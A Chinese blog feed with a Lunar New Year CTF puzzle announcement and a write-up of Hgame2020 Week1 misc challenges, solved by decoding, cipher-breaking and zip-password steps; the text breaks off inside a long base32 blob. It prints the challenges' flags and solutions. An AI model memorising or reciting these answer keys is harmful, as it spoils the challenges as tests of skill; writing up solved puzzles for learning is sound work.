        <content type="html"><![CDATA[<h2 id="鼠年快乐"><a href="#鼠年快乐" class="headerlink" title="鼠年快乐"></a>鼠年快乐</h2><p>又是一年春来到，鼠年的钟声敲响了！</p><p><strong>鼠你健康，鼠你平安，鼠你快乐喵~</strong></p><p>这一年过的太难了，还要感谢大家的陪伴哈！</p><p>最近新型冠状病毒感染的肺炎来了，公共场所都关闭了emmm</p><p><strong>武汉加油！中国加油！</strong></p><p><strong>过年了，大家都要健康快乐呀！</strong></p><br><hr><br><h2 id="红包闯关"><a href="#红包闯关" class="headerlink" title="红包闯关"></a>红包闯关</h2><p>说到这个红包闯关，最开始是听说有学长的红包闯关，FJJ 学长也弄过一个，元旦的时候白师傅扔了个RSA的密码红包，Milkice 的年终总结里也出了道红包题。</p><p>反正就挺有意思的嘛23333</p><p>我的话其实元旦的时候就想弄了。</p><p>不过那时候一堆考试，去年12.31下午六点多才考完高频，后面又要考DSP，根本没空出题……</p><p>所以，不如趁着春节出道题玩玩呀！</p><br><hr><br><h2 id="题目来了"><a href="#题目来了" class="headerlink" title="题目来了"></a>题目来了</h2><p>就出个 <strong>Misc</strong> 的题吧，花了一番心思，做题看脑洞吧，可以好好玩玩！</p><p>社会主义核心价值观深入人心，那我们就从这开始吧！</p><pre><code>自由诚信自由自由文明和谐文明自由爱国自由敬业和谐自由自由自由平等自由自由爱国自由敬业平等爱国平等和谐和谐公正和谐和谐自由友善公正自由友善自由自由友善法治自由公正平等爱国平等爱国自由敬业和谐和谐和谐和谐自由友善敬业平等富强自由平等平等爱国自由爱国平等民主和谐公正自由友善公正和谐文明自由公正和谐平等自由友善自由平等自由自由法治平等民主和谐和谐平等和谐自由敬业平等公正和谐文明自由自由自由诚信民主自由诚信文明和谐和谐自由平等自由友善敬业自由诚信自由平等自由自由法治平等民主和谐自由自由友善公正自由友善法治自由友善法治平等公正和谐和谐平等法治平等法治平等敬业自由诚信文明自由诚信和谐自由诚信自由自由友善自由平等法治自由法治平等法治平等友善自由平等自由自由平等自由友善爱国平等友善自由平等爱国平等爱国自由法治自由友善公正和谐和谐平等自由自由友善法治平等友善自由平等公正自由法治自由敬业和谐文明自由诚信文明平等富强自由法治自由诚信富强平等敬业平等自由自由法治和谐自由平等自由自由诚信文明自由诚信自由平等文明平等自由自由法治自由和谐和谐和谐平等自由自由法治自由诚信和谐平等文明平等法治自由自由平等法治和谐文明和谐和谐自由友善平等自由诚信和谐平等诚信富强平等法治自由法治平等法治平等诚信富强自由友善公正自由友善平等自由友善法治平等友善自由平等法治自由自由平等法治平等友善自由和谐和谐自由法治自由法治自由诚信和谐平等爱国平等平等自由和谐自由诚信和谐自由诚信文明平等自由自由法治自由文明自由自由自由自由自由敬业和谐文明和谐和谐自由公正自由法治自由敬业平等诚信富强平等自由自由法治自由友善法治平等友善自由平等自由自由公正和谐平等自由法治平等法治平等和谐平等敬业自由友善公正平等富强自由公正平等友善自由平等平等自由爱国自由敬业和谐和谐自由诚信文明自由友善法治</code></pre><p>总共有<strong>4个Flag</strong>，对应着4个Alipay红包。</p><p><strong>形式都是 <code>MIAO{.+}</code></strong>，可能是<strong>纯数字</strong>或<strong>纯汉字</strong>。</p><p>如果红包过期了，1月31日前直接私戳把flag发给我就好了喵！</p><p>后面再发出题记录和WP。</p><p><strong>注意解出来的flag不要随便发给别人啊！！！</strong></p><p>（如果写WP的话过几天再发出来吧。</p><h3 id="Hint"><a href="#Hint" class="headerlink" title="Hint"></a>Hint</h3><p>闯关需要一关一关过嘛，可能有点难度，给点小提示吧。</p><ol><li>套娃挺好玩的，比如这回一个文件里套了好几个，flag就越埋越深23333。</li><li>编码家族里，<code>base64</code>挺常用的，但别只想着它吧。哦对了，社会主义核心价值观也可以用来编码的呢。</li><li>Tony偶尔会和小伙伴发邮件交流。</li><li>Tony偶尔用<code>PhotoShop</code>修修图什么的，可能还会往图片里藏点什么有意思的东西，当然工具不只是PS。</li><li>十六进制编辑器在手，有可能哪天一不小心把文件改错了就打不开了或者说损坏了。</li><li>二维码是个好东西，能传递的信息不只是网址，还有……但是前提是你能找到它。</li><li>Tony喜欢用<code>Python</code>来码代码，很多现成的库贼方便。而且编译后……</li><li>中文的话有可能需要借助<code>Unicode</code>编码。</li><li>一步步深入还会有进一步的提示，备注是个好东西。</li><li>（我也不记得了，自己想吧2333</li></ol><h3 id="Just-have-fun！"><a href="#Just-have-fun！" class="headerlink" title="Just have fun！"></a><strong><em>Just have fun！</em></strong></h3><p><strong>有问题欢迎留言，或者私戳呀！</strong></p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Life </tag>
            
            <tag> CTF </tag>
            
            <tag> 红包闯关 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CTF | Hgame2020 Week1 WriteUp</title>
      <link href="/2020/01/23/CTF_Hgame2020/"/>
      <url>/2020/01/23/CTF_Hgame2020/</url>
      
        <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>这几天玩了玩杭州电子科技大学的<strong>Hgame2020</strong>，还别说，有点意思2333。</p><p><strong>平台网址：</strong></p><p><a href="https://hgame.vidar.club/" target="_blank" rel="noopener">https://hgame.vidar.club/</a></p><p>Flag格式：<code>hgame{.+}</code> </p><br><p><strong>20200125 更新：</strong></p><p>官方WP地址：<a href="https://github.com/vidar-team/Hgame2020_writeup" target="_blank" rel="noopener">https://github.com/vidar-team/Hgame2020_writeup</a></p><hr><hr><h2 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h2><h3 id="签到题"><a href="#签到题" class="headerlink" title="签到题"></a>签到题</h3><pre><code>Li0tIC4uLi0tIC4tLi4gLS4tLiAtLS0tLSAtLSAuIC4uLS0uLSAtIC0tLSAuLi0tLi0gLi4tLS0gLS0tLS0gLi4tLS0gLS0tLS0gLi4tLS4tIC4uLi4gLS0uIC4tIC0tIC4uLi0t</code></pre><p>base64解码得到</p><p><code>.-- ...-- .-.. -.-. ----- -- . ..--.- - --- ..--.- ..--- ----- ..--- ----- ..--.- .... --. .- -- ...--</code></p><p>一看就是摩斯电码，加入分隔符后解码得到flag</p><p><code>W3LC0ME_TO_2020_HGAM3</code></p><blockquote><p>在线解密摩斯密码 <a href="http://www.atool9.com/morse.php" target="_blank" rel="noopener">www.atool9.com/morse.php</a></p></blockquote><h3 id="壁纸"><a href="#壁纸" class="headerlink" title="壁纸"></a>壁纸</h3><p>解压得到图片<code>Pixiv@純白可憐.jpg</code>，foremost提取得到一个zip压缩文件。备注提示 <code>Password is picture ID.</code></p><p><img src="/2020/01/23/CTF_Hgame2020/misc_wallpaper.png" alt="misc_wallpaper"></p><p>本来还以为是在图片的文件里，而且还找到了一个id属性，然而并不是。</p><p>上网查了一下<code>純白可憐</code>，发现是P站画家，看了一篇介绍原来每张图片有个编号来着。</p><p>试了试百度搜图，出来的画风有点不对劲emmm。干脆直接上P站搜，然后在页面上找到了这张图。</p><p><img src="/2020/01/23/CTF_Hgame2020/misc_wallpaper2.png" alt="misc_wallpaper2"></p><p>（还别说，挺好看的哇，还是个中国画师喵。</p><p><strong>天意</strong> <a href="https://www.pixiv.net/artworks/76953815" target="_blank" rel="noopener">https://www.pixiv.net/artworks/76953815</a></p><p>得到ID <code>76953815</code>，作为密码解压<code>flag.txt</code>（这么短还全数字，其实可以暴力破解的），得到</p><pre><code>\u68\u67\u61\u6d\u65\u7b\u44\u6f\u5f\u79\u30\u75\u5f\u4b\u6e\u4f\u57\u5f\u75\u4e\u69\u43\u30\u64\u33\u3f\u7d</code></pre><p>Unicode啦，转ASCII（用的是<strong>NATIVE转ASCII</strong>来着）得到flag</p><p><code>hgame{Do_y0u_KnOW_uNiC0d3?}</code></p><hr><h3 id="克苏鲁神话"><a href="#克苏鲁神话" class="headerlink" title="克苏鲁神话"></a>克苏鲁神话</h3><p>明文攻击得到了解密后的zip文件。</p><p><img src="/2020/01/23/CTF_Hgame2020/misc_kesulu.png" alt=""></p><p>得到加密的 <code>The Call of Cthulhu.doc</code>文件。根据 <code>Bacon.txt</code>文件提示寻找密码。</p><pre><code>of SuCh GrEAt powers OR beiNGS tHere may BE conCEivAbly A SuRvIval oF HuGely REmOTE periOd.*Password in capital letters.</code></pre><p>然而不成功，不知道怎么做下去了嘤嘤嘤。</p><pre class=" language-python"><code class="language-python"><span class="token operator">>></span><span class="token operator">></span> s<span class="token operator">=</span><span class="token string">'of SuCh GrEAt powers OR beiNGS tHere may BE conCEivAbly A SuRvIval oF HuGely REmOTE periOd'</span><span class="token operator">>></span><span class="token operator">></span> s1<span class="token operator">=</span><span class="token punctuation">[</span>i <span class="token keyword">for</span> i <span class="token keyword">in</span> s <span class="token keyword">if</span> i<span class="token operator">>=</span><span class="token string">'A'</span> <span class="token operator">and</span> i<span class="token operator">&lt;=</span><span class="token string">'Z'</span><span class="token punctuation">]</span><span class="token operator">>></span><span class="token operator">></span> s1<span class="token punctuation">[</span><span class="token string">'S'</span><span class="token punctuation">,</span> <span class="token string">'C'</span><span class="token punctuation">,</span> <span class="token string">'G'</span><span class="token punctuation">,</span> <span class="token string">'E'</span><span class="token punctuation">,</span> <span class="token string">'A'</span><span class="token punctuation">,</span> <span class="token string">'O'</span><span class="token punctuation">,</span> <span class="token string">'R'</span><span class="token punctuation">,</span> <span class="token string">'N'</span><span class="token punctuation">,</span> <span class="token string">'G'</span><span class="token punctuation">,</span> <span class="token string">'S'</span><span class="token punctuation">,</span> <span class="token string">'H'</span><span class="token punctuation">,</span> <span class="token string">'B'</span><span class="token punctuation">,</span> <span class="token string">'E'</span><span class="token punctuation">,</span> <span class="token string">'C'</span><span class="token punctuation">,</span> <span class="token string">'E'</span><span class="token punctuation">,</span> <span class="token string">'A'</span><span class="token punctuation">,</span> <span class="token string">'A'</span><span class="token punctuation">,</span> <span class="token string">'S'</span><span class="token punctuation">,</span> <span class="token string">'R'</span><span class="token punctuation">,</span> <span class="token string">'I'</span><span class="token punctuation">,</span> <span class="token string">'F'</span><span class="token punctuation">,</span> <span class="token string">'H'</span><span class="token punctuation">,</span> <span class="token string">'G'</span><span class="token punctuation">,</span> <span class="token string">'R'</span><span class="token punctuation">,</span> <span class="token string">'E'</span><span class="token punctuation">,</span> <span class="token string">'O'</span><span class="token punctuation">,</span> <span class="token string">'T'</span><span class="token punctuation">,</span> <span class="token string">'E'</span><span class="token punctuation">,</span> <span class="token string">'O'</span><span class="token punctuation">]</span><span class="token operator">>></span><span class="token operator">></span> <span class="token string">''</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span>s1<span class="token punctuation">)</span><span class="token string">'SCGEAORNGSHBECEAASRIFHGREOTEO'</span></code></pre><p><strong>20200125 更新：</strong></p><p>看了官方WP才知道<code>Bancon</code>指的是培根密码，我还以为是咸肉/熏猪肉来着。。</p><p>根据大小写转为a或b，比如小写为a，大写为b。</p><p><img src="/2020/01/23/CTF_Hgame2020/misc_kesulu2.png" alt="官方WP"></p><p>flag隐藏在最后emmm</p><p>Ctrl+D把隐藏取消掉就看到了。</p><p><code>hgame{Y0u_h@Ve_F0Und_mY_S3cReT}</code></p><hr><h3 id="签到题ProPlus"><a href="#签到题ProPlus" class="headerlink" title="签到题ProPlus"></a>签到题ProPlus</h3><p><code>Password.txt</code>提示了</p><pre><code>Rdjxfwxjfimkn z,ts wntzi xtjrwm xsfjt jm ywt rtntwhf f y   h jnsxf qjFjf jnb  rg fiyykwtbsnkm tm  xa jsdwqjfmkjy wlviHtqzqsGsffywjjyynf yssm xfjypnyihjn.JRFVJYFZVRUAGMAI</code></pre><blockquote><ul><li>Three fences first, Five Caesar next. English sentense first,  zip password next.</li></ul></blockquote><p>一开始还以为前面的是3个栅栏，后面的是5个凯撒，然后试了半天都不对。</p><p>突然一想应该是先栅栏再凯撒，一试果然。</p><p>先解密zip密码：栅栏得到<code>JFARZGFVMVRAJUIY</code>，凯撒得到密码 <code>EAVMUBAQHQMVEPDT</code>。解压得到 <code>OK.txt</code>。</p><p>同时上面的那句话同理解密得到</p><blockquote><p>Many years later as he faced the firing squad, Colonel Aureliano Buendia was to remember that distant afternoon when his father took him to discover ice.</p></blockquote><p>emmm不大理解，不管了。</p><p>看文件是Ook!编码，解密得到base32编码。</p><pre><code>data:text;base32,NFLEET2SO4YEWR3HN5AUCQKBJZJVK2CFKVTUCQKBKFIUCQKBIVCUGQKZIFAUCRCPINCW6S2BIFAU6V2VNRCVCVSSGRXE6MTBKM3DIRKOO53UIMZPGB3DOV3ZINJVOOCHMNCTQ33LMJFXEQKPHBQSW3CBKNLC6MRTIFAUIKZVMM4WIQKBIRVWOQ2FIF3UCY2NIFIUCK2ZIFTUCOCBIZCECSKBKBDUCSKBMZGUCUKBJ5AUI2DHIFAUQN2ZJU2GKL3WNIXWINBQM5CTANJZOZHG2YLYLJQW6L2KMIYXGM3YJMYFIVRWK52G25LNMFYGMYKZF5GFUMKRHF3TMY2WLBQXC4DNOVLVO4KQPFLTSYSOHBJXIRJRMVWHEWTSOBWXCWBSNVIHSMTEKVIGGT3OIZLDE4LRLJZGY3DRNI4GY5SXPJTEK4SSJZMHAYJSME3FU4LMHFYGUODUNZLEIM2EOB4FMZDROFWWCNK2MFXS6STCGFZTG6CLGBKFMNSXORWXK3LBOBTGCWJPJRNDCUJZO43GGVSYMFYXA3LVK5LXCUDZK44WETRYKN2EKMLFNRZFU4TQNVYVQMTNKB4TEZCWJ5FU66BRNRXHON2OJRAXGVLVOR5HGTCJMJ3XMNLNFNVUE2SDFM3XC3LHPFCVKTLOGBUE2WKUGNSFKMCIKF4WQ2ZLNNFGSQ2PF5ZG2ZZWI5KU22RQNBRVCUJTORRTCSCRPFUGWT3LJRUVGRZYOIZHGNSHIVEWQMDYMNJVCM3IMYYTGULXNBCUW3KMPFJUOOCMGZ2TMV2BJFUFK6DGKNAXU2DGKYZVIR2XHBEXCULUGBIXAOCPPJLEU6BXKVRDGRCPKI4WI2LEJZDGMYKFKBUDEYLQMVGGC2TFGRNHSUDWONKHA33RG5AWYOKPNJJEY6DCKVRDGVCPKE4TS3LEJZDFQWKFF5YDAYKKMFFWC6TFGZNHSRDWON5HI4DROJAW4OKPNZIUYQSYLBRG4VCQKFHDK3TEHFFFKWKVF5XTANSGLJFXCN3EGZFDMQTWJUXXK4CLNZBW45CDNZITOTSVLBGHMUSQKFHDK3RZGFFFKNCVHFXVKK2ILJYW2NDEOFHDOQTWJEVXKNKPNVBW45CDNZ3TOTSVNZEHIUTWMNGTKSBRGJFDAMCWHFXVCK2ILJYWYNDUOFHDO2DOJEVSW6CPNVUXC43VNM4TC6TUKJDGGMTJNVZEMODEJQZVMTZSGMYTESRQGBLFM5BSNZHW2ZTRN5VGWMCVHFQXM2TQMM3HAKZQFN2TKT3NINYXM5KVGUYHUZDEIVRW22LOOJLDQZCMNZSE4MTOHEYUUVJUKZLDSNTOJ5WWE4DPIRZTEVJZMF3GU4DDGVYHKOBPOVYEW3SDOF3HIVJVGB4GITSJMRWXS5TSKY4FMTDOORHDC3TEHFFFKWLEKY4XC3SPNVGHA4CEJUZFQOJWNZUXAYZZOJ2XG6TUOBYXERDRKB2FKNKVPBTE4322NV4WM3SXHAYUI3DUHE4W2ZCOIZLFSZC2F5YW4S3NJQ2XIQSNK5RDQNSYOVYWG5DWOZZVI4DPOFZEY4CQMRRTOVKSLBHG64DRPBTEQUZZGFKHI5BZMRUWITSGKZRGI4D2OBXDM4KJGVHEMUCXOI2DMWCPOFTHIUDSOVKHAZ3SOI3HMTKXPBUDSSZWJY2WSQ2CNJBVGTKZMZJXK2TFLFTWOWLXNNVEOSBQOJXTG3KJJFDU2SSJPBUDSSZWJY2WSQ2CNJBVGTKZMZJXK2TFLFTWOWLXNNVEOSBQOJXTG3KJJFDU2SSJPBUDSSZWJY2WSQ2CNJBVGTKZMZJXK2TFLFTWOWLXNNVEOSBQOJXTG3ZUGNUEOULDM4YG6MKOIRMGIZCTKZZG6UKSIRFUCUSEOFAU4RDRIFDEIS2BKJCHCQKOIRYUCRSEJNAVERDRIFHEI4KBIZCEWQKSIRYUCTSEOFAUMRCLIFJEI4KBJZCHCQKGIRFUCUSEOFAU4RDRIFDEIS2BKJCHCQKOIRYUCRSEJNAVERDRIFHEI4KBIZCEWQKSIRYUCTSEOFBUQYKFI42TKM2ZJZ4UOSLDPFLHESTNOQ3XU5DFKNFHK2TCNFYHGWDCNJFVOTLMMEZWETBSGU2G4NDUMFEW26DQOJHDKNDZKZZEU3LUG55HIZKTJJ2WUYTJOBZVQYTKJNLU23DBGNREYMRVGRXDI5DBJFWXQ4DSJY2TI6KWOJFG25BXPJ2GKU2KOVVGE2LQONMGE2SLK5GWYYJTMJGDENJUNY2HIYKJNV4HA4SOGU2HSVTSJJWXIN32ORSVGSTVNJRGS4DTLBRGUS2XJVWGCM3CJQZDKNDOGR2GCSLNPBYHETRVGR4VM4SKNV2DO6TUMVJUU5LKMJUXA42YMJVEWV2NNRQTGYSMGI2TO3RZOBTHOQ3TMN3WYYSVGUVW4VDQIFTCWQTVNNKWWSDXINDUCTRZIEZVGS2TIR3UERDHI4VWOYTIJBFEENCBNB3UIZCROQ2GU22BHBAVCNCCOVXVOMCUPFAVOQKJHBATGVKMKNGDKQKEIFCSWQLCOFDHARRYIFBGOQ3GIFHDC2JQM4VUCQLXIJ3HISBLOAVUUMSZLFRGYU2GGFQWYN3CMRSWU2DJJJSTSMRZGU3HI2CTJBMSWMKUK42WK2CUK5NHG2SWOZFHKZBLF5NFO2DJIN3FKOLMLBMTIK3MMJKTKWLJLB3GI5TFMVZFSVLIGJIHIVJROVMG6VJRNVRESMLCPFRG4ZTWGJLG6WLHOIYVAWSWGJHVA4CXGFHVOSLMG4ZWEM3OOEZEMSLENI3VMTTCNQ3EMTS2NV4U4VZYNU2TGNZZNRQUOSKLHFKDEVTENJVDMVTUKRWGSSTFHEZDSNJWORUFGSCZFMYVIVZVMVUFIV22ONVFM5SKOVSCWL22K5UGSQ3WKU4WYWCZGQVWYYSVGVMWSWDWMR3GKZLSLFKWQMSQORKTC5KYN5KTC3LCJEYWE6LCNZTHMMSWOBUVCMKEI5UWQWLUHFDEEY3FNZKDGMCKGFIG4VCOKZZTOVLXNBFDSSKYKRJVQSDUGA4WIT3EKQ2TA6SWMJBTATJUKNSFGRRYGJWFEM3DKAZWM3SVJ5LE2MKXO52EIK2JNZKVEWCQOAYGIMKEMR5DKML2NRKE4MLTJFIWM2KKGEYFM6BWMRIGMULOKUVWITJRK55HIVCDIVXDA2DEJZFGGZJTKQYTANJRKBXFITSWONGFC6TIJIYUSWD2MFLEQZDXF5SCWZCRGVKXUVTCIMYFANDJMRJEMYZLNZJDGVKOGNIG4WCPKZGTGV3XNBBCWSLOLBJFQSDQGA4TSQ3EKQ2TA6SWMJHTCTTHGFBFGZSLM5GECTLXGVEFE33QON5FUSCXOVMEKM2ZIRIXS2BWIRVDEVKKJUVXATZZLF2UUK3XI5UGYRBQJBEG632TLI2VIZBWPBSFI5DHJZCEWSDPJ5TFEULLNJ4W4N3MNE3W4TCBMJDUKTCSMMVWS2CKJBWE6M3CIYZE6V2FGNGUSU3JGU4UERCTMZFWG5LNKB2GG42KOVMUC2CGPI3EOSDLOVITKZDDMZQTKWKUMR3UEQ2LNZVU2UCKMNWHUNTPGYYXS53NG5TVGRKVKBMWGZKTOBGG4MKCGFZGY6COGJATATLPMVTTIOLMINKFA4KUOZLUY2LGONJHM5LWPE4XKRTIKI3UWYTNGNFHAR3RMJXEITRRPJ5EGRKJLFHEWSTMLBRDKSTZOBSTIWLIIRBGYVKNOFXGCSTVMRGTGVCNJVMWG2LHNNVW4VSONJWG4NTQGVUEGRKNI5WFK6LRORZWWNKVF5RU2ULYM54XCR2SKN2FKM2PNVRHA3SHJVFVCUKTK5KHC3JRPF5HIUJZO54EGR2EINYVUVSHGJKGGNTCOVDVSWLXLJDEISTQI5YWE3SEJYYXU6SDIVEVSTSLJJWFQYRVJJ4XAZJTMFHESVDIKE4XA3JYGNATM22TPB2DQ6CFN53UERCNLFIWQMCZO5XHG52CIRGVSULIGBMXO3TTO5BEITKZKFUDAWLXNZZXOQSEJVMVC2BQLF3W443XIJCE2WKRNAYFS53OON3UERCNLFIWQMCZO5XHG52CIRGVSULIGBMXO3TTO5BEITKZKFUDAWLXNZ2GSRCVJBNGORCMK5BWGZDQI5MHA332NBHTAVSXJNNFKM3DIR4WY2JXHBJHQRCUGE3WCMKKO5XGCS3WIVGXCZTVIJYFG6DEOVGTK2DQGY4HIS3LGVKDSQSXNFLVMTZTKEYG6WJLGNDWG53XHFSVO3CUMM2TMZ3SKJGEY3SMN5RFKTLCMFVGKY2ZMV3EYU3QOVMTQUKWONWGY2TMGFHDMQ2NORJHMUCNMZKGW4CVGNHGKWKLGJJWS6D2GZWTKQKHK5ZTG3TNKBXXSVLVMJWXMTKFMJNFMWJVORKGIZ2EJRLWE2T2JAYEUT2YJZVFQ3SDMRXXC43DPFYHK52GNRZE4MJUNJYUK3SMGIYXC6TIJ4YFMV2LLJKTGY2EPFWGSNZYKJ4EIVBRG5QTCSTXNZQUW5SFJVUWI3CZMQYU43TQIJKHSWCUJZWE2Z2QKJQXQSBWOA2WQQ2FJVDTCWRTKRXVU22TFNQUOSJZKVVGITLXPBUHSS2DGZRXU3ZQKV4USL2GJRCWK4KYOVDUSULXLJLEQZCPNAZFUSZVJFRWSMLJJYYXU6SDIVEVSUDRPJ2W4UKUJFXDQVKNKI3HATZULJUGUQTLKVHDANKILJXXA22SFNFVOSJPKVIGGTKRNBTXS4KPGZSEITLZLB4VC6CIOJVWE4DOI5GUWUKRLBMG4ZCHNFWVESBUN5MWUMKTHF3XQRCHIRFW6N3QO5HXUWSUJFCDAV3TKIVXCZKZKFUEIQTUK5SDANSHLJCXM3LINFIFMSJTMJIDEWBVMRIEKTZSI5XE23RRMQ4WKMKXHFZVET3BLBBE2SKSNJRWSYSYMY4DC6CZM5TVSULLOJHTKUDROZHVKNCNIFKU4SLZLJWGGL32LBEGSU2GM5BUG2ZVNMVXKLZVNJTXQQSBO5UEUV3EPEXWIY3DJI2GCQKJMFKGWVCLG4XW25KQIVCUIQ2FNRFHUSRZKY4XU3SCM5BWQ4CDKNGTO3RLME2DI6RRKJBW2RBYOJ4EQUCVNY2SW6LVGY2FGWSPHBAVC2DJPJEDSST2MRSFUMDXMN3WGWLXOBCGY3KKGZ5HKNRUKRNHKNCBKF4GS6KIJZHHUZDUMQYXO43XMRMUC2CENRWU4NT2OU3DMVDQNE2UC53YNB4UQSSNPI4WYZBRO5VXUZBUIFUEIRTNJ43FI3JXGZ5HA2BVM42HO2CDJBGE2VBRNZSDCMDOPJHHOQTINJBGWT3BMJXDOSZXOJUEU2ZXO5BEGR2MJVTDA3SOGEYW4VCCPJBDKNTTIY4EG2JPKZRGENKQOBKDMM3RGFITIVZRLBTTERZYIZ2HI2ZLORIHEULUIRBUCQSEFNFTEMTZMZLW4MLPKVUEESKBNAXUMYTCGVIHAVBWHBEVCQLTIFIWM4LUORRXMMTQMRLUKSKBK5AUS5RZKUZHKZRXKV2WUQ2FIFCEGRJTGJYWEWCIHFYVQUTIINAUE2SDMI3VMTTSNIVTCTDHO5UECQL2NB2DS33NGE2TSYLMHF3VC3CNJU4DIWCWOI2XGQSSNUYE4L3EK4ZHAYRXOZIEOOCSO5UU642ZOBUEUSDCKE3TSMLCK5WHM5JQFNRHQRCEJFQTK2TNIVXWG5CUNYYFMOLFK4VXEYRXOZCUKTLIG5UU6WKTOB4DCT3CKFMDCMLCGZ2HM5JYO5MXQSCPJE3GQ4LOIVKVU5CEMYZVM5DRK4VTO6TYOZCWGSLKOJDUWWKTKIZDATZPMRLTC4DCG52FA3JYKF3XSR3VLE2WQS2IJRKTKOKGMZMGY5TRGIVTO6CCIREWKNDKNVCXCY3EKRWTARRZMRLSW4TCG53E2R2NKJ5GST3PMFYHQRSHMJITGOJRMJQWY5TVHA4GE6CIINETM6DJNVCWWZDUIR3DGVTUMFLSWN2UGRSDI4LBKNSWOVDRFNUDANLVGJHXA5KVKV5EIT2FIJUG4RCXMNUXKNKSKRGU2NCRI5DWGTS2PFFTO3CGJV3XU2CBLFNHOMLOJFZHKVKVPJCE6RKCNBXEIV3DNF2TKUSUJVGTIUKHI5RU4WTZJM3WYRSNO55GQQKZLJ3TC3SJOJ2VKVL2IRHUKQTINZCFOY3JOU2VEVCNJU2FCR2HMNHFU6KLG5WEMTLXPJUECWK2O4YW4SLSOVKVO6TENNHFCTDNGN4WG2LUPJYXK5BTMFFHIYLGG5FG2M3GOF3GQU2HKU4WC3SNOFQTOZTPK4YXCL3DNVQWIZLVF5DG6WSRGFYWG6LQG5YCW2BXMFYDSU3EOIYXCMZPK5UGQQ2XLIXUW3SPOI3EQZDRNUYXAK3TK5RGMK3BGJCUSWSYGBYWGNTSOJSDE2LCK5XCW6K2OQZTM4RUKVUGYUCXOB5EW3LVGM3EM5DBOYZUU3LOLBZHM6DBI5KU4YLOJVYWKNTGN5STE4LGKVXGCOLBOQXTC32ZKFWG2ZTZOB5HCK3IGNQXA5DBMZZEM3JTF5WXI2CDI5LDSS3OJ5YTMM3EN5WTC4BPONWWEZBLOEVUMSLEIRXHOS3DNNSWKWKPJVAVINSIKBSVKSSNF5RUCWK2IFXCWT3FNN2VGWSPHBAVCNSIKBRVKNKJHBRXOY2ZIFXDET3FGBYVGWRLGRAVCNSEKBRVKOKKHBZXOZCZIFVDAT3FGRYFGWRWGVAXO6KCKBZWGOKKMNVXUZBUIFUDAT3FGRYHSURVGVTTI52CKBXWGOJVKFVXUOLXIJUGYRCVLJ5EY5LHFM3FS4BSOMZXQ5TGLJXFIUSWK5EFOZTZMJTU6ZLGKNUDGTSKNZSDSSSVLFSFMOKKOVGTMNKOI5EGG23VMYZVK3CUNBLFQM3NLF5HE22FMNTHS2JRHFSGSZCOIZLGEZC2PJFXKULYGU4UWTDGGAZFUMBQKZLGQMLOHBWTIRDONYYG6ZD2KNNDGZSTKZDUQVTGKNRGUT3VKRJGQM2KJRXDSMKKKU2FMVRZGVWU2NRVIJEEQODPORTFQWLOKRJFMVZTK5RXS4TLJVSWMU3JGM4U43LEJZDFMWLELIXUU5KBGU2TSS2IMMYHCY3KMFJXC4DHGNEWMWKOOJZDC3RLLBCSWNCFKEZWSULVOBCHKQJQPA3TGZTSOZRXGS3ELFAWOUCVNBTFGZSZIJYHEMLWF5MFKNRUIV3XU2CRMVYEG5LHHB3TOWCYOJ3DQ42KMQ2ES2CQIVUGIU2QMNBHA4RROUXVQYZVGRKTI53IIFSXAQZLNMVXOTCULBZGMODVJI4XOSTIOZAWOZCTJBSEENLKGJ2XMWDGGVMVCN3XKJAWK4CDGZVSW52EKRMHEZRLOU2XQ52KPBVEGZZZKNDGIQRZM4ZHK5SXMY2WGVBXNNJHCQ2MMM4HAV22JN2W45BQGFSWE3ZYGVYWGM2ZK5SDQSSTMFFVQRLTNNFU2MSSGUXVQNKPO52TOSKTNYYUK6KKLE2EKY3UKRXDM5SDLJXGIMSFNZIEWVTNKNUHOTBVJNVE4MDFMMYU6YTTJRHSWRLQJZLFA2KXINBEQYSZGQVXEODOLJMGIZ2KKQ3G2WSFONRUGT2XOB5DSSDMJZ5HKN2DKRXGQS32LJITIRTTNBJG2NSQKBQTGSRSIYZWEQ2VGJYW26CMIZAWU5DPMNTFMNSUOM3XK52FGU2VGTLZK5HUEWCMKU2XK2T2NVYHUZDILIZXO3CKN5YGGU3ZKFXXUWSINY4WM2ZTKA2FGQKJGREFC52DIFCHQZ2DIFEHUQKFIFCGOQJULFAUCQRYO5BECRBUM5BUKQLXIFRU2QKRIEVVSQLHIE4ECRSEIFEUCUBPO5AUM3ZQNBKVU4TIGFWUCQKBIFAUESSSKU2UK4TLJJTWOZZ5HU======</code></pre><p>再base32解密得到</p><pre><code>iVBORw0KGgoAAAANSUhEUgAAAQQAAAEECAYAAADOCEoKAAAOWUlEQVR4nO2aS64ENwwD3/0v7WyCSW8GcE8okbKrAO8a+lASV/23AAD+5c9dAADkgCEAwAcMAQA+YAgA8AFDAIAPGAIAfMAQAOADhgAAH7YM4e/vj/d40gE059vNmaxZao/Jb1s3xK0TV6WtmumapfaY/LZ1Q9w6cVXaqpmuWWqPyW9bN8StE1elrZrpmqX2mPy2dUPcOnFV2qqZrllqj8lvWzfErRNXpa2a6Zql9pj8tnVD3DpxVdqqma5Zao/Jb1s3xK0TV6WtmumapfaY/LZ1Q9w6cVXaqpmuWWqPyW9bN8StE1elrZrpmqX2mPy2dVOKOx1lnw7NLAsUutzsLIbwv5m+kBjC+7qmgyEUMn0hMYT3dU0HQyhk+kJiCO/rmg6GUMj0hcQQ3tc1HQyhkOkLiSG8r2s6GEIh0xcSQ3hf13QwhEKmLySG8L6u6WAIhUxfSAzhfV3TGW8IqQt0Qp8OzVJx7Ub3DOR9didNFfaEPh2apeLaje4ZyPvsTpoq7Al9OjRLxbUb3TOQ99mdNFXYE/p0aJaKaze6ZyDvsztpqrAn9OnQLBXXbnTPQN5nd9JUYU/o06FZKq7d6J6BvM/upKnCntCnQ7NUXLvRPQN5n91JU4U9oU+HZqm4dqN7BvI+u5OmCntCnw7NUnHtRvcM5H12J00V9oQ+HZql4tqN7hnI++xOmiqsuk91ztRFc2imrF8dL3VO2312J00VVt2nO